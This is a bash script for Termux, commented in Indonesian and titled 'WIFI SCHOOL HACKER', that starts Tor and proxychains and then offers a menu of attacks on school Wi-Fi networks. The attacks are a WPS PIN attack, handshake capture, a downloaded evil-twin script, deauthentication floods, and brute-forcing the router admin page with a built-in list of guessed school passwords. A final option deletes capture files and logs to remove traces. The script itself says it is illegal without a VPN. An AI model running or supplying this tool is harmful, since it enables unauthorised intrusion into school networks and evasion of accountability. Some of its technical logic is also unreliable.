#!/data/data/com.termux/files/usr/bin/bash

# Warna keren
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# ============================================
# 🎭 VPN CHECK & ACTIVATION - FIXED VERSION!
# ============================================

clear
echo -e "${PURPLE}"
echo "╔════════════════════════════════════════╗"
echo "║   NESIA DARKNET - VPN FIRST SYSTEM     ║"
echo "║    NO VPN = NO HACKING 😈              ║"
echo "╚════════════════════════════════════════╝${NC}"
echo ""

vpn_activation() {
    echo -e "${YELLOW}[+] CHECKING VPN CONNECTION...${NC}"
    
    # Cek apakah TOR sudah terinstall
    if ! command -v tor &> /dev/null; then
        echo -e "${RED}[!] TOR belum terinstall!${NC}"
        echo -e "${GREEN}[+] Installing TOR & Proxy Chains...${NC}"
        pkg install tor proxychains-ng -y
    fi
    
    # Kill any existing tor process
    pkill tor 2>/dev/null
    
    # Start TOR service dengan timeout lebih panjang
    echo -e "${YELLOW}[+] Starting TOR VPN Service...${NC}"
    tor &
    TOR_PID=$!
    
    # Tunggu TOR bootstrap lebih lama
    echo -e "${CYAN}[+] Waiting for TOR to bootstrap (max 30 seconds)...${NC}"
    
    # Progress bar sederhana
    for i in {1..30}; do
        sleep 1
        if kill -0 $TOR_PID 2>/dev/null; then
            echo -ne "${GREEN}.${NC}"
        else
            echo -e "\n${RED}[!] TOR process died!${NC}"
            return 1
        fi
    done
    echo ""
    
    # Cek koneksi TOR dengan metode yang lebih baik
    echo -e "${CYAN}[+] Testing VPN anonymity...${NC}"
    
    # Metode 1: Cek apakah port 9050 listening
    if ! netstat -tuln 2>/dev/null | grep -q ":9050"; then
        echo -e "${RED}[!] TOR SOCKS5 port not listening${NC}"
        return 1
    fi
    
    # Metode 2: Cek dengan curl tapi lebih simple
    local tor_check
    tor_check=$(curl --socks5-hostname localhost:9050 --max-time 30 -s https://check.torproject.org/ 2>/dev/null || true)
    
    # Cek jika ada kata Congratulations ATAU jika kita bisa connect ke port 9050
    if echo "$tor_check" | grep -iq "congratulations" || \
       curl --socks5-hostname localhost:9050 --max-time 10 -s http://httpbin.org/ip >/dev/null 2>&1; then
        echo -e "${GREEN}[✓] VPN TOR AKTIF! IP Tersembunyi 😎${NC}"
        echo -e "${BLUE}[+] IP Publik kamu sekarang:${NC}"
        curl --socks5-hostname localhost:9050 --max-time 10 -s https://api.ipify.org 2>/dev/null || echo "Cannot get IP"
        echo ""
        echo -e "${GREEN}[+] VPN Protocol: SOCKS5 Port 9050${NC}"
        echo -e "${GREEN}[+] Country: Hidden 🇺🇳${NC}"
        return 0
    else
        echo -e "${YELLOW}[!] TOR mungkin aktif tapi halaman pengecekan gagal${NC}"
        echo -e "${YELLOW}[+] Checking if we can connect through proxy...${NC}"
        
        # Coba koneksi sederhana melalui proxy
        if timeout 10 curl --socks5 127.0.0.1:9050 http://google.com >/dev/null 2>&1; then
            echo -e "${GREEN}[✓] Proxy connection successful! Continuing...${NC}"
            return 0
        else
            echo -e "${RED}[✗] Cannot connect through proxy${NC}"
            return 1
        fi
    fi
}

# ============================================
# 🛡️ ANONYMITY CHECK - SIMPLIFIED
# ============================================

anonymity_monitor() {
    while true; do
        sleep 60  # Cek setiap 1 menit
        
        # Cek apakah TOR process masih hidup
        if ! ps aux | grep -v grep | grep -q "tor"; then
            echo -e "${RED}[⚠] TOR PROCESS MATI!${NC}"
            echo -e "${YELLOW}[+] Restarting TOR...${NC}"
            tor &
            sleep 5
        fi
        
        # Cek koneksi sederhana
        if ! curl --socks5-hostname localhost:9050 --max-time 10 -s http://httpbin.org/ip >/dev/null 2>&1; then
            echo -e "${YELLOW}[!] VPN connection unstable${NC}"
        fi
    done
}

# ============================================
# 🚀 EKSEKUSI VPN DULU!
# ============================================

echo -e "${RED}[‼] PERINGATAN:${NC}"
echo -e "${YELLOW}[+] Tool ini ILLEGAL tanpa VPN!${NC}"
echo -e "${CYAN}[+] VPN akan diaktifkan otomatis...${NC}"
echo ""

# Jalankan VPN check
if vpn_activation; then
    echo -e "${GREEN}[✓] VPN CHECK PASSED!${NC}"
    
    # Jalankan monitor VPN di background
    anonymity_monitor &
    MONITOR_PID=$!
    
    # ============================================
    # 🖥️ MAIN HACKING TOOL SETELAH VPN AKTIF
    # ============================================
    
    clear
    echo -e "${GREEN}"
    echo "╔════════════════════════════════════════╗"
    echo "║   WIFI SCHOOL HACKER v3.1 FIXED       ║"
    echo "║   VPN STATUS: ✅ AKTIF                 ║"
    echo "║   ANONYMITY: 100% TERJAGA 😎          ║"
    echo "╚════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${PURPLE}[+] All traffic melalui TOR Network!${NC}"
    echo -e "${PURPLE}[+] ISP tidak bisa lacak aktivitas!${NC}"
    echo ""
    
    # Function jalankan dengan VPN
    run_with_vpn() {
        proxychains -q "$@" 2>/dev/null
    }
    
    # Install tools via VPN
    echo -e "${YELLOW}[+] Installing tools via VPN...${NC}"
    pkg update -y
    pkg install -y aircrack-ng hydra macchanger reaver bully tcpdump curl wget git
    
    # Setup proxychains config yang benar
    echo "socks5 127.0.0.1 9050" > $PREFIX/etc/proxychains.conf
    
    # Main hacking function
    start_hacking() {
        echo -e "${RED}[+] WIFI HACKING MODE AKTIF!${NC}"
        
        # Check if device supports monitor mode
        echo -e "${YELLOW}[+] Checking WiFi capabilities...${NC}"
        if ! iw phy | grep -q "monitor"; then
            echo -e "${RED}[✗] Device tidak support monitor mode!${NC}"
            echo -e "${YELLOW}[+] Hacking limited to basic attacks${NC}"
        fi
        
        # Tampilkan menu
        echo ""
        echo -e "${BLUE}╔══════════════════════════════════╗${NC}"
        echo -e "${BLUE}║         ATTACK METHODS           ║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════╣${NC}"
        echo -e "${BLUE}║ 1. WPS Pin Attack (via VPN)     ║${NC}"
        echo -e "${BLUE}║ 2. Handshake Capture (via VPN)  ║${NC}"
        echo -e "${BLUE}║ 3. Evil Twin (via VPN)          ║${NC}"
        echo -e "${BLUE}║ 4. Deauth Attack (via VPN)      ║${NC}"
        echo -e "${BLUE}║ 5. Router Admin Brute (via VPN) ║${NC}"
        echo -e "${BLUE}║ 6. Check VPN Status             ║${NC}"
        echo -e "${BLUE}║ 7. Install Wordlist             ║${NC}"
        echo -e "${BLUE}║ 8. Exit & Clean Logs            ║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════╝${NC}"
        echo ""
        
        read -p "Pilih attack [1-8]: " attack_choice
        
        case $attack_choice in
            1)
                echo -e "${RED}[+] Starting WPS Attack via VPN...${NC}"
                read -p "Masukkan BSSID target: " target_bssid
                run_with_vpn reaver -i wlan0 -b $target_bssid -vv
                ;;
            2)
                echo -e "${RED}[+] Capturing Handshake via VPN...${NC}"
                read -p "Masukkan BSSID target: " target_bssid
                read -p "Masukkan Channel: " target_channel
                
                # Create wordlist if not exists
                if [ ! -f "wordlist.txt" ]; then
                    echo -e "${YELLOW}[+] Creating wordlist...${NC}"
                    cat > wordlist.txt << EOF
admin
admin123
password
password123
123456
12345678
school123
sekolah123
smk2024
guru123
EOF
                fi
                
                echo -e "${YELLOW}[+] Use another device to capture handshake${NC}"
                echo -e "${YELLOW}[+] Run: airodump-ng -c $target_channel --bssid $target_bssid -w capture wlan0${NC}"
                echo -e "${YELLOW}[+] Then: aireplay-ng -0 10 -a $target_bssid wlan0${NC}"
                ;;
            3)
                echo -e "${RED}[+] Evil Twin via VPN...${NC}"
                echo -e "${YELLOW}[+] Downloading evil twin script...${NC}"
                run_with_vpn wget https://raw.githubusercontent.com/TechnicalMujeeb/Termux-wifi-hacking/main/evil_twin.sh
                chmod +x evil_twin.sh
                ./evil_twin.sh
                ;;
            4)
                echo -e "${RED}[+] Deauth Attack via VPN...${NC}"
                read -p "Masukkan BSSID target: " target_bssid
                read -p "Jumlah packets (default 100): " packets
                packets=${packets:-100}
                echo -e "${YELLOW}[+] Sending $packets deauth packets...${NC}"
                run_with_vpn aireplay-ng -0 $packets -a $target_bssid wlan0
                ;;
            5)
                echo -e "${RED}[+] Router Admin Brute via VPN...${NC}"
                echo -e "${YELLOW}[+] Common school router IPs:${NC}"
                echo "192.168.1.1"
                echo "192.168.0.1"
                echo "10.0.0.1"
                
                read -p "Masukkan router IP: " router_ip
                echo -e "${YELLOW}[+] Trying common passwords...${NC}"
                
                # Common passwords list
                for pass in admin password 1234 123456 admin123; do
                    echo -e "${CYAN}Trying admin/$pass${NC}"
                    run_with_vpn curl -s "http://$router_ip" --data "username=admin&password=$pass" | grep -q "incorrect" || \
                    echo -e "${GREEN}[✓] Password found: $pass${NC}" && break
                done
                ;;
            6)
                echo -e "${GREEN}[+] VPN STATUS CHECK${NC}"
                echo -e "${CYAN}[+] TOR Process:${NC}"
                ps aux | grep -v grep | grep tor
                echo -e "${CYAN}[+] Proxy Connection Test:${NC}"
                run_with_vpn curl -s https://api.ipify.org
                echo ""
                ;;
            7)
                echo -e "${YELLOW}[+] Downloading wordlist...${NC}"
                run_with_vpn wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
                echo -e "${GREEN}[✓] Wordlist downloaded!${NC}"
                ;;
            8)
                echo -e "${YELLOW}[+] Cleaning semua logs...${NC}"
                rm -f *.cap *.csv *.txt *.log
                kill $MONITOR_PID 2>/dev/null
                pkill tor 2>/dev/null
                echo -e "${GREEN}[+] Semua jejak dihapus!${NC}"
                echo -e "${RED}[+] Goodbye! 😈${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Pilihan salah!${NC}"
                ;;
        esac
    }
    
    # Loop utama
    while true; do
        start_hacking
        echo ""
        read -p "Tekan Enter untuk kembali ke menu..."
        clear
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   WIFI SCHOOL HACKER v3.1 FIXED       ║${NC}"
        echo -e "${GREEN}║   VPN STATUS: ✅ AKTIF                 ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
        echo ""
    done
    
else
    echo -e "${RED}[✗] VPN ACTIVATION FAILED!${NC}"
    echo -e "${YELLOW}[+] Trying alternative method...${NC}"
    
    # Alternative: Just install tools without VPN
    echo -e "${YELLOW}[+] Installing tools without VPN...${NC}"
    pkg install -y aircrack-ng curl wget
    
    echo -e "${RED}[!] WARNING: NO VPN PROTECTION!${NC}"
    echo -e "${YELLOW}[+] Basic tools installed. Use at your own risk!${NC}"
    echo -e "${YELLOW}[+] Exiting in 3 seconds...${NC}"
    sleep 3
    exit 1
fi
